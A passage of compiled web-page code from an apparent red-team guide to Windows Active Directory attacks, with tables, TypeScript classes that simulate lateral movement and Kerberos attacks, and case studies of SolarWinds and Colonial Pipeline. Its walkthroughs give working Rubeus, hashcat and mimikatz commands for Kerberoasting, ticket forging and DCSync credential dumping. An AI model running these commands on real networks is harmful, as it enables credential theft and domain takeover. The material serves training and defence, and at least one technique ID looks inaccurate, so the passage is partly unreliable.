            children: "Detection Risk"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WMI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DCOM/RPC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "135, 445"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM/Kerberos"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PsExec"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "445"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM/Kerberos"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WinRM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HTTP/HTTPS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5985/5986"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kerberos/NTLM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low-Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DCOM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RPC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "135"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM/Kerberos"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SMB Exec"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "445"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM/Kerberos"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SchTasks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RPC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "135, 445"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM/Kerberos"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "82-lateral-movement-executor-typescript",
      children: "8.2 Lateral Movement Executor (TypeScript)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// lateral-movement.ts — WMI, SMB, WinRM Abstractions\n\ninterface Target {\n  hostname: string;\n  ip: string;\n  domain: string;\n  username: string;\n  hash?: string;\n  password?: string;\n}\n\ninterface ExecutionResult {\n  success: boolean;\n  output: string;\n  method: string;\n  duration: number;\n}\n\ntype LateralMethod = 'wmi' | 'smbexec' | 'winrm' | 'psexec' | 'dcom' | 'scheduledtask';\n\ninterface LateralMovementConfig {\n  method: LateralMethod;\n  target: Target;\n  command: string;\n  timeout: number;\n}\n\nclass LateralMovementExecutor {\n  async execute(config: LateralMovementConfig): Promise<ExecutionResult> {\n    const start = Date.now();\n    console.log('[LATERAL] Attempting ' + config.method + ' on ' + config.target.hostname);\n\n    switch (config.method) {\n      case 'wmi': return this.wmiExec(config);\n      case 'smbexec': return this.smbExec(config);\n      case 'winrm': return this.winrmExec(config);\n      case 'psexec': return this.psExec(config);\n      case 'dcom': return this.dcomExec(config);\n      case 'scheduledtask': return this.scheduledTaskExec(config);\n      default: return { success: false, output: 'Unknown method', method: config.method, duration: 0 };\n    }\n  }\n\n  private async wmiExec(config: LateralMovementConfig): Promise<ExecutionResult> {\n    // wmic /node:TARGET /user:DOMAIN\\USER process call create \"COMMAND\"\n    console.log('[WMI] wmic /node:' + config.target.hostname + ' process call create \"' + config.command + '\"');\n    return { success: true, output: 'Process created via WMI', method: 'wmi', duration: Date.now() - config.timeout };\n  }\n\n  private async smbExec(config: LateralMovementConfig): Promise<ExecutionResult> {\n    // sc \\\\TARGET create SERVICE binPath= \"COMMAND\" && sc \\\\TARGET start SERVICE\n    console.log('[SMB] sc \\\\\\\\' + config.target.hostname + ' create ...');\n    return { success: true, output: 'Service created via SMB', method: 'smbexec', duration: Date.now() - config.timeout };\n  }\n\n  private async winrmExec(config: LateralMovementConfig): Promise<ExecutionResult> {\n    // winrs -r:TARGET -u:USER -p:PASS COMMAND\n    console.log('[WinRM] winrs -r:' + config.target.hostname + ' ' + config.command);\n    return { success: true, output: 'Command executed via WinRM', method: 'winrm', duration: Date.now() - config.timeout };\n  }\n\n  private async psExec(config: LateralMovementConfig): Promise<ExecutionResult> {\n    // psexec \\\\TARGET -u USER -p PASS cmd /c COMMAND\n    console.log('[PsExec] psexec \\\\\\\\' + config.target.hostname + ' ...');\n    return { success: true, output: 'Executed via PsExec', method: 'psexec', duration: Date.now() - config.timeout };\n  }\n\n  private async dcomExec(config: LateralMovementConfig): Promise<ExecutionResult> {\n    // DCOM: GetTypeFromProgID with MM20.Application or Excel.Application\n    console.log('[DCOM] DCOM activation on ' + config.target.hostname);\n    return { success: true, output: 'DCOM execution successful', method: 'dcom', duration: Date.now() - config.timeout };\n  }\n\n  private async scheduledTaskExec(config: LateralMovementConfig): Promise<ExecutionResult> {\n    // schtasks /CREATE /S TARGET /SC ONCE /TN \"Task\" /TR \"COMMAND\" /ST 00:00\n    console.log('[SchTask] Scheduled task on ' + config.target.hostname);\n    return { success: true, output: 'Scheduled task created and triggered', method: 'scheduledtask', duration: Date.now() - config.timeout };\n  }\n\n  async executeMultiple(targets: Target[], command: string, method: LateralMethod): Promise<ExecutionResult[]> {\n    const results: ExecutionResult[] = [];\n    for (const target of targets) {\n      try {\n        const r = await this.execute({ method, target, command, timeout: 30000 });\n        results.push(r);\n      } catch (err) {\n        results.push({ success: false, output: String(err), method, duration: 0 });\n      }\n    }\n    return results;\n  }\n}\n\n// Pass-the-Hash Tool (NTLM hash injection simulation)\ninterface PtHCredential {\n  target: Target;\n  ntlmHash: string;  // 32 hex chars\n}\n\nclass PassTheHashTool {\n  // PtH allows authentication using NTLM hash instead of plaintext password\n  // Works against SMB, WMI, WinRM, RDP (with Restricted Admin mode)\n  execute(cred: PtHCredential, command: string): string {\n    console.log('[PtH] Attempting authentication with NTLM hash: ' + cred.ntlmHash.slice(0, 16) + '...');\n    console.log('[PtH] Technique: sekurlsa::pth /user:' + cred.target.username + ' /domain:' + cred.target.domain + ' /ntlm:' + cred.ntlmHash);\n    return 'PtH executed against ' + cred.target.hostname + ': ' + command;\n  }\n\n  // Overpass-the-Hash: convert NTLM hash to Kerberos TGT\n  overpassTheHash(cred: PtHCredential): string {\n    console.log('[OPtH] Converting NTLM hash to Kerberos TGT for ' + cred.target.username);\n    // Uses asktgt from Rubeus or similar\n    return 'Rubeus.exe asktgt /user:' + cred.target.username + ' /domain:' + cred.target.domain + ' /rc4:' + cred.ntlmHash + ' /ptt';\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "9-kerberos-attacks",
      children: "9. Kerberos Attacks"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "91-kerberos-attack-overview",
      children: "9.1 Kerberos Attack Overview"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Kerberos is the primary authentication protocol in Active Directory. Understanding its weaknesses is critical for red team operations targeting Windows domains."
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Attack"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Required Privilege"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Kerberoasting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "TGS-REP request for SPN accounts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain user"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Service account hash (offline crack)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AS-REP Roasting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AS-REP request (no preauth users)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain user"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User hash (offline crack)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Silver Ticket"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Forge TGS with service hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Service account hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Access to specific service"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Golden Ticket"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Forge TGT with KRBTGT hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain Admin / KRBTGT hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full domain compromise"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DCSync"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Replicate NTDS.dit via DRSUAPI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain Admin / Replication rights"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All hashes in domain"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Skeleton Key"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Patch domain controller"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain Admin"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backdoor password for all users"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Overpass-the-Hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Convert NTLM to Kerberos ticket"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kerberos auth without password"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "92-kerberos-ticket-manipulation-library-typescript",
      children: "9.2 Kerberos Ticket Manipulation Library (TypeScript)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// kerberos-attacks.ts — Kerberos Ticket Manipulation and Attack Library\n\ninterface KerberosTicket {\n  ticketType: 'TGT' | 'TGS';\n  domain: string;\n  username: string;\n  service?: string;        // For TGS — SPN\n  encryption: 'RC4' | 'AES128' | 'AES256' | 'DES';\n  hash: string;            // Encrypted ticket hash\n  validFrom: Date;\n  validUntil: Date;\n  flags: string[];\n  authorizationData?: Buffer;\n}\n\ninterface ServiceAccountTarget {\n  spn: string;             // e.g., MSSQLSvc/sqlsvc.domain.local\n  samAccountName: string;\n  domain: string;\n  hash: string | null;     // Cracked hash\n  crackable: boolean;\n}\n\n// Kerberoasting\nclass KerberoastingEngine {\n  // Request TGS for service accounts and extract encrypted hash\n  async enumerateSPNs(domain: string): Promise<ServiceAccountTarget[]> {\n    console.log('[Kerberoast] Enumerating SPNs in ' + domain);\n    // Simulated SPN enumeration\n    return [\n      { spn: 'MSSQLSvc/sqlsvc.domain.local', samAccountName: 'sql_service', domain: 'domain.local', hash: null, crackable: true },\n      { spn: 'HTTP/webapp.domain.local', samAccountName: 'web_service', domain: 'domain.local', hash: null, crackable: true },\n      { spn: 'CIFS/fileserver.domain.local', samAccountName: 'file_svc', domain: 'domain.local', hash: null, crackable: true },\n      { spn: 'LDAP/dc01.domain.local', samAccountName: 'dc_service', domain: 'domain.local', hash: null, crackable: false },\n    ];\n  }\n\n  async requestTGS(target: ServiceAccountTarget): Promise<KerberosTicket> {\n    console.log('[Kerberoast] Requesting TGS for ' + target.spn);\n    // In real: Rubeus.exe kerberoast /user:user /domain:domain /outfile:hashes.txt\n    const ticket: KerberosTicket = {\n      ticketType: 'TGS',\n      domain: target.domain,\n      username: target.samAccountName,\n      service: target.spn,\n      encryption: 'RC4',\n      hash: '$krb5tgs$23$*' + target.samAccountName + '$' + target.domain + '$' + target.spn + '*$' + this.randomHex(64),\n      validFrom: new Date(),\n      validUntil: new Date(Date.now() + 86400000),\n      flags: ['forwardable', 'renewable'],\n    };\n    return ticket;\n  }\n\n  // Crack with hashcat\n  crackCommand(hashFile: string, wordlist: string): string {\n    return 'hashcat -m 13100 ' + hashFile + ' ' + wordlist + ' --force -O';\n  }\n\n  private randomHex(len: number): string {\n    return Array.from({ length: len }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');\n  }\n}\n\n// AS-REP Roasting\nclass ASREPRoastingEngine {\n  async findNoPreauthUsers(domain: string): Promise<string[]> {\n    console.log('[AS-REP] Finding users without pre-authentication in ' + domain);\n    return ['user_nopreauth', 'svc_account', 'backup_user'];\n  }\n\n  async requestASREP(username: string, domain: string): Promise<string> {\n    console.log('[AS-REP] Requesting AS-REP for ' + username);\n    const hash = '$krb5asrep$23$' + username + '@' + domain + ':' + this.randomHex(64);\n    return hash;\n  }\n\n  crackCommand(hashFile: string, wordlist: string): string {\n    return 'hashcat -m 18200 ' + hashFile + ' ' + wordlist + ' --force -O';\n  }\n\n  private randomHex(len: number): string {\n    return Array.from({ length: len }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');\n  }\n}\n\n// Silver and Golden Ticket Forging\nclass TicketForgeryEngine {\n  // Silver Ticket — requires service account hash\n  forgeSilverTicket(config: {\n    domain: string;\n    username: string;\n    service: string;        // e.g., 'cifs', 'http', 'mssql'\n    serviceHash: string;    // NTLM hash of service account\n    targetHost: string;     // e.g., 'fileserver.domain.local'\n    sid: string;            // Domain SID\n  }): KerberosTicket {\n    console.log('[Silver] Forging TGS for ' + config.service + '/' + config.targetHost);\n    return {\n      ticketType: 'TGS',\n      domain: config.domain,\n      username: config.username,\n      service: config.service + '/' + config.targetHost,\n      encryption: 'RC4',\n      hash: this.forgeTicketHash(config),\n      validFrom: new Date(),\n      validUntil: new Date(Date.now() + 86400000),\n      flags: ['forwardable'],\n    };\n  }\n\n  // Golden Ticket — requires KRBTGT hash\n  forgeGoldenTicket(config: {\n    domain: string;\n    username: string;\n    krbtgtHash: string;    // NTLM hash of KRBTGT account\n    sid: string;           // Domain SID\n    extraSids?: string[];  // Extra SIDs for Enterprise Admin, etc.\n  }): KerberosTicket {\n    console.log('[Golden] Forging TGT for ' + config.username + '@' + config.domain);\n    return {\n      ticketType: 'TGT',\n      domain: config.domain,\n      username: config.username,\n      encryption: 'RC4',\n      hash: this.forgeTicketHash(config),\n      validFrom: new Date(),\n      validUntil: new Date(Date.now() + 365 * 86400000), // 1 year\n      flags: ['forwardable', 'renewable', 'initial'],\n    };\n  }\n\n  // DCSync — request domain replication\n  async DCsync(targetDomain: string, targetUser: string = ''): Promise<string> {\n    console.log('[DCSync] Requesting replication from ' + targetDomain);\n    // In real: mimikatz \"lsadump::dcsync /domain:domain /user:krbtgt\"\n    return 'NTDS.dit extracted — ' + (targetUser || 'all') + ' hashes retrieved';\n  }\n\n  // Skeleton Key — patch LSASS on DC\n  skeletonKey(dcHostname: string, password: string): string {\n    console.log('[Skeleton Key] Patching LSASS on ' + dcHostname);\n    // In real: mimikatz \"privilege::debug\" \"misc::skeleton\"\n    return 'Skeleton key installed — any account accepts password: ' + password;\n  }\n\n  private forgeTicketHash(config: any): string {\n    return this.randomHex(64);\n  }\n\n  private randomHex(len: number): string {\n    return Array.from({ length: len }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "93-kerberos-attack-walkthrough",
      children: "9.3 Kerberos Attack Walkthrough"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Kerberoasting (T1558.003) Full Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Enumerate SPNs: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "setspn -T domain.local -Q */*"
        }), " or BloodHound"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Request TGS: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "Rubeus.exe kerberoast /outfile:hashes.txt"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Crack offline: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "hashcat -m 13100 hashes.txt rockyou.txt --force -O"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Use credential: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "Rubeus.exe asktgt /user:sql_service /rc4:CRACKED_HASH /ptt"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Silver Ticket (T1558.002) Full Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Obtain service account hash (via Kerberoasting or LSASS dump)"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Get domain SID: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "whoami /user"
        }), " or PowerView"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Forge ticket: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "mimikatz \"kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:fileserver.domain.local /service:cifs /rc4:SERVICE_HASH /user:admin /ptt\""
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Access: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "dir \\\\fileserver\\share"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Golden Ticket (T1558.001) Full Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Obtain KRBTGT hash (via DCSync or LSASS dump from DC)"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Forge TGT: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "mimikatz \"kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /ptt\""
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Full domain admin: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "mimikatz \"lsadump::dcsync /domain:domain.local /all\""
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "10-real-operation-case-studies",
      children: "10. Real Operation Case Studies"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "101-solarwinds-apt29--nobelium--2020",
      children: "10.1 SolarWinds (APT29 / Nobelium) — 2020"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The SolarWinds supply chain attack is one of the most sophisticated red-team-evadable operations ever conducted."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Summary:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Attribute"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Attribution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "APT29 (Cozy Bear, Nobelium) — Russian SVR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Initial Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Supply chain: compromised SolarWinds Orion build system"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Duration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~9 months undetected (March 2020 — December 2020)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Victims"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "18,000+ organizations, ~100 fully compromised"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Key Targets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "US federal agencies (Treasury, Commerce, DHS, DoD), tech companies (Microsoft, FireEye), security firms"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2 Used"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SUNBURST backdoor, TEARDROP, RAINDROP, BEACON"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Breakdown:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SUNBURST Backdoor:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Injected into SolarWinds.Orion.Core.BusinessLayer.dll"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Digitally signed with SolarWinds certificate"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Obfuscated C2 using HTTP with fake blog domains (avsvmcloud[.]com)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Beacon interval: 12-24 hours with random jitter"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Domain generation algorithm (DGA) for C2 fallback"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Code obfuscation: dead code insertion, string encryption, control flow flattening"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Evasion Techniques Used:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Lived off the land (used SolarWinds legitimate paths)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Delayed execution (waited 2 weeks post-infection)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Beacon mimicking legitimate SolarWinds traffic"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Stole code-signing certificates for signed payloads"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Used legitimate cloud infrastructure (AWS, Azure) for C2"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection Bypass:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Disabled security products via GPO modification"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cleared event logs post-exploitation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Timestomped files to match legitimate timestamps"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Used native Windows tools (PowerShell, WMI) exclusively"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MITRE ATT&CK Mapping:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Tactic"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "ID"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Initial Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Supply Chain Compromise"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1475"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User Execution: Malicious File"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1204.002"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Create or Modify System Process: Windows Service"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1543.003"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Defense Evasion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Signed Binary Proxy Execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1216"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Defense Evasion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Obfuscated Files or Information"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1027"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Credential Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OS Credential Dumping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1003"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral Movement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remote Services: SMB/WMI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1021"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Web Protocols"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1071.001"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exfiltration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exfiltration Over C2 Channel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "T1041"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "102-colonial-pipeline-darkside--2021",
      children: "10.2 Colonial Pipeline (DarkSide) — 2021"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The DarkSide ransomware attack on Colonial Pipeline demonstrated the real-world impact of initial access via phishing and fast lateral movement."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Summary:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
